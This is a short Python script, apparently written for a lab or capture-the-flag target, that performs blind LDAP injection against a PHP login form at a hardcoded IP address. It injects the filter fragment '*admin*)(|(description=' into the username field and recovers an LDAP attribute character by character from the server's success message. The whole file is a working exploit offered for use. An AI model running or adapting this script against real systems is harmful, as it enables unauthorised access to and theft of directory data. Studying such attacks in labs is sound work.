#!/usr/bin/env python3
import requests, string, time
from urllib.parse import quote_plus

# Configuration
URL = "http://94.237.123.119:40331/index.php"
PROXY = {"http":"http://192.168.50.169:8081"}
HEADERS = {"Content-Type":"application/x-www-form-urlencoded"}

session = requests.Session()
session.proxies.update(PROXY)
session.headers.update(HEADERS)

CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
MAX_LENGTH = 200
DELAY = 0.1
SUCCESS_TEXT = "Login successful"

def send_request(payload):
    """Send the POST request and return True if successful"""
    # URL-encode the payload so spaces and & etc. don't break the request, but make an exception for *
    encoded = quote_plus(payload, safe="*")

    # Craft the body with the encoded payload
    body = f"username=*admin*)(|(description={encoded}&password=invalid)"

    # Send the request
    response = session.post(URL, data=body, timeout=10)

    # Return True if we see the success message
    return SUCCESS_TEXT in response.text

def exfiltrate():
    """Guess the description field character by character"""
    found = ""
    for pos in range(1, MAX_LENGTH + 1):
        for char in CHARSET:
            test_payload = f"{found}{char}*"
            if send_request(test_payload):
                found += char
                print(f"Found character at position {pos}: {char} -> {found}")
                break
            time.sleep(DELAY)
        else:
            print("No more characters found, stopping.")
            break

if __name__ == "__main__":
    exfiltrate()